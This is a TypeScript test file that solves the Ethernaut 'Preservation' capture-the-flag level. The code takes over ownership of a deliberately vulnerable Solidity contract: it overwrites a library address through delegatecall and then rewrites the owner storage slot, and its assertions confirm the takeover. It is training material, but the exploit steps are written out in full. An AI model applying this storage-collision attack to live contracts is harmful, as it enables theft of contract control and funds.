
import { accounts, contract } from '@openzeppelin/test-environment';
import assert = require('assert');

// Addresses
const [
    owner, // Contract owner
    attacker, // Attacker
] = accounts;

// Loads contracts
const Preservation = contract.fromArtifact('Preservation');
const LibraryContract = contract.fromArtifact('LibraryContract');
const PreservationAttack = contract.fromArtifact('PreservationAttack');
let preservation: any;
let libraryContract1: any;
let libraryContract2: any;
let preservationAttack: any;

beforeEach(async () => {
    // Contracts deployment
    libraryContract1 = await LibraryContract.new();
    libraryContract2 = await LibraryContract.new();
    preservationAttack = await PreservationAttack.new();
    preservation = await Preservation.new(
        libraryContract1.address,
        libraryContract2.address,
        { from: owner }
    );
});

it('Preservation -> claim ownership of the instance', async () => {

    // Check contract owner before the attack
    const ownerBefore = await preservation.owner.call();

    // Convert the attacker contract address to uint256
    const attackerContractInt = await preservationAttack.convertAddressToInt(
        preservationAttack.address,
        { from: attacker }
    );

    // Updates the attacker contract address into variable `timeZone1Library`
    await preservation.setFirstTime(attackerContractInt);

    // Convert the attacker address to uint256
    const attackerInt = await preservationAttack.convertAddressToInt(
        attacker,
        { from: attacker }
    );

    // Store attacker address into variable `owner`
    await preservation.setFirstTime(attackerInt, { from: attacker });

    // Check contract owner after the attack
    const ownerAfter = await preservation.owner.call();

    // The contract ownership is now the attacker ;)
    assert(ownerBefore === owner);
    assert(ownerAfter === attacker);
});


/*
Reference:
https://medium.com/coinmonks/ethernaut-lvl-16-preservation-walkthrough-how-to-inject-malicious-contracts-with-delegatecall-81e071f98a12
*/
